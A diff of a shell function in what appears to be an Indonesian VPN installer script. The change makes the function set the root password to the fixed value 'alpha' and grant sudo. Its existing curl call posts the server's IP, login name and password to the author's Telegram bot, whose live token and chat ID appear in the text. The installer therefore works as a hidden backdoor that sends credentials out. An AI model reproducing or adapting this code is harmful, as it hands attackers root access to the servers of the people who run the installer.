@@ -270,18 +270,41 @@ clear
 function password_default() {
     domain=$(cat /root/domain)
     MYIP=$(curl -sS ipv4.icanhazip.com)
+    
+    # === AMBIL DATA DARI GITHUB PERMISSION ===
+    # Pastikan URL ini mengarah ke RAW file (teks polos)
+    wget -q -O /tmp/izin "https://raw.githubusercontent.com/hokagelegend9999/ijin/main/alpha"
+    
+    # Format Github: ### Nama Tanggal IP Status
+    # Kita grep IP-nya dulu, baru ambil kolom 2 (Nama) dan kolom 3 (Exp)
+    
+    nama_buyer=$(grep -w "$MYIP" /tmp/izin | awk '{print $2}')
+    exp_buyer=$(grep -w "$MYIP" /tmp/izin | awk '{print $3}')
+    
+    # Hapus file izin setelah dibaca agar bersih
+    rm -f /tmp/izin
+    
+    # Cek apakah IP terdaftar. Jika kosong (tidak ada di github), set ke Trial
+    if [[ -z "$nama_buyer" ]]; then
+        nama_buyer="Free/Trial"
+        exp_buyer="-"
+    fi
+
+    # === SETTING USER SYSTEM ===
     userdel jame > /dev/null 2>&1
-    Username="alpha"
+    Username="root"
     Password=alpha
     mkdir -p /home/script/
     useradd -r -d /home/script -s /bin/bash -M $Username > /dev/null 2>&1
     echo -e "$Password\n$Password\n"|passwd $Username > /dev/null 2>&1
     usermod -aG sudo $Username > /dev/null 2>&1
 
+    # === SETTING TELEGRAM ===
     CHATID="1469244768"
     KEY="7911375235:AAERwknqnWLoqWFbsSuUfqCQGMy93UQHUTk"
     TIME="10"
     URL="https://api.telegram.org/bot$KEY/sendMessage"
+
     TEXT="Installasi VPN Alpha V2.0
     ============================
     <code>Tanggal    :</code> <code>$tanggal</code>
@@ -297,11 +320,10 @@ function password_default() {
     <code>IP Vps     :</code> <code>$MYIP</code>
     <code>User Login :</code> <code>$Username</code>
     <code>Pass Login :</code> <code>$Password</code>
-    <code>User Script:</code> <code>$username</code>
-    <code>Exp Script :</code> <code>$exp</code>
+    <code>User Script:</code> <code>$nama_buyer</code>
+    <code>Exp Script :</code> <code>$exp_buyer</code>
     ============================
 "
-
    curl -s --max-time $TIME -d "chat_id=$CHATID&disable_web_page_preview=1&text=$TEXT&parse_mode=html" $URL >/dev/null
 }
 clear
